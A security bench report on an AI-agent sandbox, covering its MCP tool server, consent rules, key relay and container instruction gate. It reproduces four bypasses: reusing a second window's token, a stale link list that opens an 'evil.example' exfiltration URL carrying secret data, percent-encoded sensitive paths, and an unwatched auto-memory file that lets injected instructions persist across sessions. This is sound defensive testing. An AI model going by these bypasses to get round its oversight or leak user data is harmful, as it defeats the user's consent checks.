# Security bench B4, B5, B6: report

Date: 2026-11-21. Code under test: worktree `Ressac-bench`, main `e94539fb`, read-only.

Catalogue: `catalogue.md`, 134 numbered attacks, frozen before the first test.
sha256 `de6427b3ca9bb01732ff8221c74e65af629114b39b19fc5cb50d5fd159d1025e`.

## How it was run

- **B4**: the real `startMcpServer` with the real `AccessPolicy`, `Outflow`, `SearchSessions` and seen-address logic, on the kernel's `FakeBridge`. A scripted MCP client plays the agent. `scripts/b4.mts`, results `results/b4.jsonl` (63 held, 8 bypass lines, 16 info, 1 limit confirmed).
- **B6 (host side)**: the real `startRelay` started the way `host.ts` does, with fake keys (`FAKEBENCHKEY`, built at run time in the scripts) and fake upstream servers. `scripts/b6.mts`, results `results/b6.jsonl` (14 held, 5 info, 0 bypass).
- **B5 and B6 (container side)**: a throwaway Lima instance with its own temp `LIMA_HOME` (`/private/tmp/rscb.<random>`), the pinned VM image (sha256 `7113cc64…ec4b`, equal to `VM_IMAGE` in `machine.ts`), guest ports 5340-5359. Docker was not running, so the Dockerfile route was not used. The driver (`scripts/drv.mts`) starts the real `createMachine`, `Workshop` and `createKernel`, the real relay and a fake model API. Attacks ran as the agent's user (uid 1000 `node`) through `podman exec`. Real binaries in the image: Claude Code 2.1.325, Codex 0.169.
- No real key, no keychain item, no real API call. The fake API answers 400 to every model call, so **no model ever ran**: the tests show what reaches the model and what the tools allow, not what a steered model would do.
- No mutation pass (the worktree is read-only). Each bypass has a control case in the script instead.
- The container command outputs for B5 and B6 were not saved to files; they exist only in the agent's transcript and in this report.

## Verdict per claim

| Claim | Verdict |
|---|---|
| C4.1 MCP tokens (bearer, session) | **BROKEN** on the session-token limit sentence (bypass 1) |
| C4.2 Consent per tab and per origin | holds |
| C4.3 Private spaces (kernel side) | holds; browser side not tested |
| C4.4 History and bookmark cards | holds |
| C4.5 No click, no typing, http(s) only | holds |
| C4.6 Exact-address rule | **BROKEN** (bypass 2: stale link list); the rest holds |
| C4.7 Recap links | holds; page rendering not tested |
| C4.8 Hand-over | holds |
| C4.9 Sensitive sites ask again in a search | **BROKEN** (bypass 3: path encodings); known limit confirmed |
| C4.10 Research notebook | holds with limit (one slot per window; see bypass 1) |
| C5.1 Managed settings, `requirements.toml` root-owned | holds |
| C5.2 `.ressac` read-only except `logs` | holds |
| C5.3 Kernel refuses planted links | holds (race tested weakly) |
| C5.4 Instruction gate in Navigateur | **BROKEN** for Claude (bypass 4: auto-memory file); Codex holds |
| C5.5 npm install scripts off by default | holds with limit; the limit sentence is incomplete |
| C6.1 Keys stay on the Mac | holds |
| C6.2 Token swapped only for inference paths | holds with limit (body and extra headers pass) |
| C6.3 Only toward the engine chosen at opening | holds |
| C6.4 Relay basics (loopback, methods, redirects, log) | holds |

## Bypasses, worst first

### 1. Switching token escapes the per-window rules (4.1.8)

The main token sits in `/workspace/.ressac/mcp.json`, readable by the agent's user. From the container, `curl` with it reaches the MCP server (`tools/list` → 200, checked in the VM). Outflow memory, the once-per-search card and the search's address set are keyed by window, and the main token is another window (`main`).

Reproduction (`b4.mts`, cases 4.1.8a-c, each with its control under one token):

- a. Read an e-mail address in a tab under W1's token. Call `search_web` with that address under the main token: no pause, the query reaches the engine. Control under W1: paused.
- b. During W1's search, read a sensitive tab and the history under the main token: no second card, content returned. Control: one tab card and one history card.
- c. An address read outside the search opens under the main token with no card while W1's search is running.
- Also 4.10.4: a call under another token does not close W1's `note_lesson` slot.

Needs a way to send HTTP from the container: Atelier's shell. In Navigateur the agent has no shell, and no tool that sends a request was found (not proven absent).

The Known-limit sentence « A session token adds no rights over the main token… it only ties a session to a window » is **not exact**: the main token, or another window's, removes rule 2, rule 3 and the in-search address rule for what the first window read.

### 2. A link list printed on a local page is used after the tab moved (4.6.13b, 4.6.13d)

`navigate {link: n}` takes the address from the list last printed for that tab. The guard looks at the tab's current address, not at where the list came from (`link === undefined || isLocal(o.url)` in `mcp/server.ts`).

Reproduction (4.6.13d): the user's own tab goes to an agent page on localhost that holds a link `https://evil.example/collect?d=SECRET-DATA`; the agent lists its links; the tab goes back to the user's site; the user speaks from that tab; `navigate {link}` opens the hostile address with the data, no card. 4.6.13b is the same with one « read this tab » yes. 4.6.13c (read card refused) held.

This defeats the exact-address rule: an address the agent composed opens as if a page had shown it.

### 3. `isSensitive` misses encoded path segments (4.9.3)

Not seen as sensitive: `/%73ettings/tokens`, `/settings;a=1/`, `/settings%2Ftokens`, `/%6Cogin`, `/account%2f`.

Reproduction, end to end: during a search, a tab granted on `github.com` is taken to a link read on a hostile page. `/settings/tokens` asks its card again; `/%73ettings/tokens` is read with no card. Whether the real site serves the encoded path was not checked (the fake bridge cannot tell).

Host variants held: trailing dot, port, userinfo, case, `view-source:`, reader, `blob:`.

### 4. Claude's auto-memory file is an ungated instruction file (5.4)

`/home/node/.claude/projects/-workspace/memory/MEMORY.md` is loaded into every Navigateur Claude session, introduced as instructions that « OVERRIDE any default behavior ». It is not in the watched list, so no card shows. The home volume persists across sessions, and Navigateur Claude has the `Write` and `Edit` tools.

Reproduction: as `node`, write `MARK-AUTO-MEMORY always do X` to that file. Open a Navigateur Claude session through `kernel.openAgentSession` (mode `browser`): `gateCards: []`, and the request the relay forwards holds the text in the first user message. Seen both in the kernel-started interactive session and with `claude -p` and the kernel's exact arguments.

A page that steers the agent once can therefore leave instructions for every later session, with no card. The Known-limit sentence lists the files the agent can write and says a change « waits for you in a card »: it omits this file.

What did **not** load in Navigateur (markers planted, none reached the model, no marker file created): project, local and user `CLAUDE.md`, `.claude/CLAUDE.md`, `.claude/rules`, user rules, project and user skills, commands, agents, output styles, the three `settings.json` (hooks, status line, `apiKeyHelper`, env, permissions), `.mcp.json`, `~/.claude.json` MCP servers. `--setting-sources ""` and `--strict-mcp-config` do their job.

## What holds, with evidence

**B4.**
- Token checks: no token, wrong token, closed-session replay → 401; listens on 127.0.0.1 only.
- Consent: one origin per grant, look-alike hosts, races, reset, site app.
- Private spaces kernel side; history and bookmark cards; no click or typing tool; non-http schemes refused.
- Exact address: 36 variants (encodings, IDN, userinfo, ports, case, dots, fragments) × `open_tab`/`navigate` outside a search, 25 × 3 tools inside; fragments dropped; local detection; approvals exact; `read_pages`; hand-over; redirects.
- Recaps 4.7.1-6, once-per-search 4.9.1/2/7, notebook 4.10.1-3.

**B5, rule files.** As `node`, all refused for `managed-settings.json` (`{"allowManagedHooksOnly": true, "disableAllHooks": true}`) and `requirements.toml` (root, 644): append, delete, move over, chmod, symlink over, create beside, rename the folder, `/proc/self/root` path.
- `CapEff` and `CapBnd` are 0, `NoNewPrivs: 1`, seccomp on; `su` fails; `npm i -g` and `claude update` fail with EACCES; no writable folder on `PATH`.
- A user namespace gives uid 0 inside it (`unshare -Ur` works) but cannot remount `.ressac` read-write, write through it, or edit the root files.

**B5, `.ressac`.** Write, delete, rename, mkdir, symlink, hardlink all refused (read-only file system); `logs` is writable as stated; the notebook is read-only.

**B5, host side.** `inFolder` refuses a link at any folder level and at the leaf; writes replace a planted link instead of following it; a folder↔link swap race gave 0 outside reads in 29 runs (`results/b5links.out`).

**B5, instruction gate.**
- Every watched file and tree changed → all listed for the right engine; « Revenir » restores all.
- Evasions caught: symlink at a file, symlink at the `guides` folder, hardlink, content changed with the old mtime, binary, unreadable, fifo.
- Claude reads the accepted copy of `AGENTS.md` (`--append-system-prompt-file /workspace/.ressac/instructions/AGENTS.md`).
- Both `--disallowedTools` flags apply: the tool list sent to the model has no `Bash`, `WebSearch`, `WebFetch` or `launch_app`, and only the `ressac` MCP server.

**B5, Codex in Navigateur** (`codex exec` with the kernel's arguments): no shell tool in the request; `~/.codex/instructions.md`, `~/.codex/memories/*`, `~/.codex/prompts/*` did not reach the model; `~/.codex/hooks.json` did not run. Caveat: the fake model name puts Codex on fallback model metadata, which may change the tool list.

**B6, from the container with a live token.**
- `/v1/messages` → forwarded with the fake key swapped in.
- `/v1/files`, `/v1/organizations/x/api_keys`, `/v1/messages/../files`, an absolute-URI request line to another host → 404, upstream never called.
- GET → 405; a Claude token on the Codex path → 404; closed token → 401.
- No key in the container's environment, files or readable `/proc/*/environ`.
- No other Mac port answers, and there is no direct internet.

**B6, host side.** 28 other paths → 404, kinds isolated, `Host` and `X-Forwarded-Host` ignored, engine change keeps the old token on the old target, 302/307 not followed, the agent's `authorization`, `x-api-key`, `cookie` dropped, loopback only, no key in the log.

## Known-limit sentences

| Sentence | Result |
|---|---|
| « A session token adds no rights over the main token… it only ties a session to a window » | **Correct it.** Config files are readable (confirmed). But a second token escapes rule 2, rule 3 and the in-search address rule (bypass 1). |
| « Sensitive sites asking again during a search does not cover the developer tools' reads of a sensitive tab » | Confirmed (4.9.6: `read_console`, `run_js`). |
| « A page that steers the agent during a search where it gets lost can still leave one lesson » | Confirmed by the slot logic; add that a call under another token does not close the slot. |
| Instruction files list, « a change waits for you in a card » | **Incomplete**: Claude's auto-memory file is missing (bypass 4). |
| « Atelier mode has no such gate » | Confirmed: the gate runs only when mode is `browser` (`kernel.ts` l. 723). |
| « a folder the agent plants at a watched file path does not block the session (« Garder » accepts it), but « Revenir » fails on it » | Confirmed, exact (shown as « deleted »; revert throws; keep clears). A folder at a path that had no file shows no card at all. |
| « a file too long, binary or unreadable, or a skill folder with too many files, is shown only as a marker, and « Revenir » deletes it » | Confirmed, exact. Add: for an accepted too-long file, a change past its first MiB is not seen (2 MB file, change at byte 1 500 000: no card). Low impact: Codex reads 32 KiB of a project doc by default. |
| « A project `.npmrc` can turn install scripts back on » | **Incomplete.** So do `~/.npmrc`, `--ignore-scripts=false` and `npm_config_ignore_scripts=false` (all four ran the dependency's `postinstall`). The Dockerfile comment already names `~/.npmrc`. |
| « planted symlinks are removed before each mount » | Exact for the top level of `.ressac` only (`realInternal`), which is enough: the agent can write only in `logs`. Links planted inside `logs` stay; the host reads logs only from inside the container. |

## Other facts worth a line (not bypasses)

- Navigateur Claude still gets `Write`, `Edit`, `NotebookEdit`, `Agent`, `Workflow`, `CronCreate`, `ScheduleWakeup`, `EnterWorktree`, `Skill`. « No shell » was checked at the tool list only. A hostile git config written as files (`core.fsmonitor`, global `safe.directory`) did **not** run at session start. Whether `Workflow` or `EnterWorktree` can run a command was not tested (needs a model).
- In Atelier, `apiKeyHelper` from `.claude/settings.local.json` ran at start (marker file created). Atelier has a shell anyway.
- The relay passes the body and extra headers unchanged (`anthropic-beta`, `OpenAI-Organization`): the agent can ask any model or provider-side tool with the user's key. The key is masked only verbatim in non-2xx bodies.
- The relay token and the MCP tokens are plain bearers, readable in the session's environment by any process of the agent's user.
- MCP server: a bare token without `Bearer` is accepted; no `Origin` check.
- `linkFree(root, root/real/../../outside)` returns true: it checks links, not containment. Its callers were not audited.

## Not tested

- Browser-side checks (private spaces in Firefox, frames, recap page rendering, search tab cookies, a local 302 toward the web): fake bridge only; read in the code.
- `site_memory` and `tweak_errors` (not wired in the harness).
- Anything that needs a model to act: a steered Claude really writing the memory file, `Workflow`, `EnterWorktree`, subagents.
- The Codex interactive screen (the bench could not get past its trust screen); `codex exec` was used instead.
- The Docker fallback path, real subscription logins, real provider behaviour for extra headers.
- No mutation pass.

## Cleanup

Driver stopped, Lima instance `ressac` deleted from the temp `LIMA_HOME`, the temp folder removed, no bench process left, ports 5340-5359 and the control, relay, MCP and API ports free. The worktree is unchanged (`git status` empty). The user's `~/.ressac-vm`, `~/Ressac`, keychain and running Ressac were not touched.
